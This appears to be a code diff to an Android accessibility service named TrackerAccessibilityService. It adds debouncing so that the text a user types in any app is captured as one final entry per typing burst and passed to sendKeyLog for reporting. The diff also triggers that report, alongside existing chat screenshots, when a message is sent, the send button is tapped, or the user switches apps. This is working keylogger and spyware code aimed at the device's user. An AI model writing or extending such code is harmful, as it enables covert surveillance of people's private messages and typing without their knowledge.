@@ -48,6 +48,16 @@ class TrackerAccessibilityService : AccessibilityService() {
     private var lastChatTextLen: Int = 0
     private var lastChatTextTs: Long = 0
     private val screenshotExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
+    // ── Keylog debounce state (final-entry-only) ─────────────────────
+    // TYPE_VIEW_TEXT_CHANGED arrives for every keystroke / suggestion commit /
+    // deletion. The newest text is held here and only flushed (reported) when
+    // typing goes quiet or a finalize signal fires — see enqueueKeyLog().
+    private var pendingKeyPkg: String? = null
+    private var pendingKeyText: String? = null
+    private var lastSentKeyText: String? = null
+    private var lastSentKeyTs: Long = 0L
+    private val keylogHandler = android.os.Handler(android.os.Looper.getMainLooper())
+    private val keyFlushRunnable = Runnable { flushPendingKeyLog() }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val packageName = event.packageName?.toString() ?: return
@@ -108,6 +118,12 @@ class TrackerAccessibilityService : AccessibilityService() {
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                 if (now - lastEventTime > 2000) {
                     if (packageName != lastSwitchPkg || now - lastSwitchTs > 10_000L) {
+                        if (packageName != lastSwitchPkg) {
+                            // Switched away from the app where typing was in
+                            // progress → the pending text is final; report it
+                            // before the switch report.
+                            flushPendingKeyLog()
+                        }
                         lastSwitchPkg = packageName
                         lastSwitchTs = now
                         lastPackageName = packageName
@@ -158,6 +174,9 @@ class TrackerAccessibilityService : AccessibilityService() {
                         // empty the instant the app posts the message → screenshot it.
                         if (pkg in chatPackages) {
                             if (text.isBlank() && lastChatTextLen > 3 && now2 - lastChatTextTs < 15_000L) {
+                                // Input just cleared = the message went out → the
+                                // pending text IS the final entry; report it now.
+                                flushPendingKeyLog()
                                 maybeCaptureScreenshot(pkg, "sent")
                             }
                             if (text.isNotBlank()) {
@@ -178,7 +197,7 @@ class TrackerAccessibilityService : AccessibilityService() {
                                     return
                                 }
                             }
-                            sendKeyLog(pkg, text)
+                            enqueueKeyLog(pkg, text)
                         }
                         source.recycle()
                     }
@@ -189,6 +208,7 @@ class TrackerAccessibilityService : AccessibilityService() {
                 val pkg = event.packageName?.toString() ?: return
                 // Send / enter button tapped in a chat app → screenshot the conversation.
                 if (pkg in chatPackages && isSendButton(event)) {
+                    flushPendingKeyLog()
                     maybeCaptureScreenshot(pkg, "send")
                 }
                 val viewId = event.contentDescription?.toString()
@@ -435,6 +455,8 @@ class TrackerAccessibilityService : AccessibilityService() {
     }
 
     override fun onDestroy() {
+        // Best effort: don't lose a pending final text if the service is killed.
+        flushPendingKeyLog()
         super.onDestroy()
         if (instance == this) instance = null
     }
@@ -461,6 +483,41 @@ class TrackerAccessibilityService : AccessibilityService() {
                 e.printStackTrace()
             }
         }.start()
+    }
+
+    // ── Keylog debounce: report only the FINAL typed text ────────────
+    // TYPE_VIEW_TEXT_CHANGED fires on every keystroke, autocorrect commit and
+    // deletion — Android has no "finished typing" event. Each new edit simply
+    // replaces the pending text; it is reported once when typing goes quiet
+    // (2.5 s) or immediately on a finalize signal (message sent / send button
+    // tapped / app switch), so one typing burst = one dashboard row.
+
+    private fun enqueueKeyLog(packageName: String, text: String) {
+        if (pendingKeyPkg != null && pendingKeyPkg != packageName) {
+            flushPendingKeyLog() // typing moved to another app → previous text is final
+        }
+        pendingKeyPkg = packageName
+        pendingKeyText = text
+        keylogHandler.removeCallbacks(keyFlushRunnable)
+        keylogHandler.postDelayed(keyFlushRunnable, KEYLOG_DEBOUNCE_MS)
+    }
+
+    private fun flushPendingKeyLog() {
+        keylogHandler.removeCallbacks(keyFlushRunnable)
+        val pkg = pendingKeyPkg
+        val text = pendingKeyText
+        pendingKeyPkg = null
+        pendingKeyText = null
+        if (pkg == null || text.isNullOrBlank()) return
+        val now = System.currentTimeMillis()
+        // Blank-flush + debounce-flush can both fire for the same burst —
+        // don't report the identical text twice within 10 s.
+        if (text == lastSentKeyText && now - lastSentKeyTs < 10_000L) return
+        lastSentKeyText = text
+        lastSentKeyTs = now
+        Log.d(TAG, "Keylog final text for $pkg (${text.length} chars)")
+        writeDebugLog("Keylog final: $pkg (${text.length} chars)")
+        sendKeyLog(pkg, text)
     }
 
     private fun sendKeyLog(packageName: String, text: String) {
@@ -674,6 +731,9 @@ class TrackerAccessibilityService : AccessibilityService() {
 
     companion object {
         private const val TAG = "TrackerAccessibility"
+
+        /** Quiet period after which held typing is considered final. */
+        private const val KEYLOG_DEBOUNCE_MS = 2500L
 
         private val BROWSER_PACKAGES = setOf(
             "com.android.chrome",
